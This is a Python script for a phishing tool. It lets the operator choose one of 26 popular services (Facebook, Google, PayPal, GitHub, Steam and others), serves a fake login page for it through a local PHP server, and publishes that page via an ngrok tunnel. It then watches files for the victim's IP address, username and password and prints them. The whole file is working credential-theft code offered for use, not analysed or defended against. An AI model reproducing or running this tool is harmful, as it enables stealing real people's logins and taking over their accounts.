from pyngrok import ngrok
import os
import sys
import random
import banner
def main():
    runningoutofnames = ''
    random_port = random.randint(1000, 9999)
    print(banner.BANNERR)
    print(banner.menu)
    option1 = input('\033[1;32;40m~~(8:> \033[0m')
    if option1 == "1":
        serv = 'facebook'
    elif option1 == "2":
        serv = 'instagram'
    elif option1 == "3":
        serv = 'google'
    elif option1 == "4":
        serv = 'microsoft'
    elif option1 == "5":
        serv = 'netflix'
    elif option1 == "6":
        serv = 'paypal'
    elif option1 == "7":
        serv = 'steam'
    elif option1 == "8":
        serv = 'twitter'
    elif option1 == "9":
        serv = 'playstation'
    elif option1 == "10":
        serv = 'github'
    elif option1 == "11":
        serv = 'twitch'
    elif option1 == "12":
        serv = 'pinterest'
    elif option1 == "13":
        serv = 'snapchat'
    elif option1 == "14":
        serv = 'linkedin'
    elif option1 == "15":
        serv = 'shopping'
    elif option1 == "16":
        serv = 'protonmail'
    elif option1 == "17":
        serv = 'spotify'
    elif option1 == "18":
        serv = 'adobe'
    elif option1 == "19":
        serv = 'devianart'
    elif option1 == "20":
        serv = 'badoo'
    elif option1 == "21":
        serv = 'origin'
    elif option1 == "22":
        serv = 'yahoo'
    elif option1 == "23":
        serv = 'wordpress'
    elif option1 == "24":
        serv = 'yandex'
    elif option1 == "25":
        serv = 'stackoverflow'
    elif option1 == "26":
        serv = 'vk'
    elif option1 == "00":
        print("\n\033[1;32;40mBye!\033[0m")
        sys.exit(1)
    path1 = str(f"sites/{serv}/ip.txt")
    path2 = str(f"sites/{serv}/usernames.txt")
    if os.path.exists(path1):
        os.remove(path1)
    if os.path.exists(path2):
        os.remove(path2)
    command1 = str(f'cd sites/{serv} && php -S 127.0.0.1:{random_port} > /dev/null 2>&1 &')
    os.system(command1)
    tunnel = ngrok.connect(random_port, "http")
    the_tunnels = ngrok.get_tunnels()
    yurrrr = str(the_tunnels[0])
    yurrrr = str(yurrrr.replace('NgrokTunnel', '\033[1;32;40mLink\033[0m'))
    yurrrr = str(yurrrr.replace('"', ''))
    yurrrr = str(yurrrr.replace('->', ''))
    yurrrr = str(yurrrr.replace('http://localhost:', ''))
    random_port = str(f"{random_port}")
    yurrrr = str(yurrrr.replace(random_port, ''))
    print(str(f'\n{yurrrr}'))
    print("\n\033[1;32;40mWaiting...\033[0m")
    printedip = False
    printedcred = False
    while True:
        if os.path.exists(path1):
            with open(path1) as ip:
                ipp = ip.readlines(1)
                ippp = ipp[0]
                ippp = str(ippp.replace("IP:", ""))
                lock1 = 0
                while lock1 == 0 and not printedip:
                    print(f"\n\033[1;32;40mCaptured IP Address:\033[0m {ippp}")
                    printedip = True
                else:
                   if os.path.exists(path2):
                       while True:
                           with open(path2) as creds:
                               credss = creds.readlines(1)
                           for creden in credss:
                               runningoutofnames = creden
                           lock2 = 0
                           while lock2 == 0 and not printedcred:
                               lmafo = str("\033[1;32;40mUsername: \033[0m")
                               lmfao = str("\033[1;32;40mPassword: \033[0m")
                               runningoutofnames = str(runningoutofnames.replace("Username: ",lmafo))
                               runningoutofnames = str(runningoutofnames.replace("Pass: ",lmfao))
                               runningoutofnames = str(runningoutofnames.replace("Account: ",lmafo))
                               print(runningoutofnames)
                               printedcred = True
                               sys.exit(1)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        ngrok.kill()
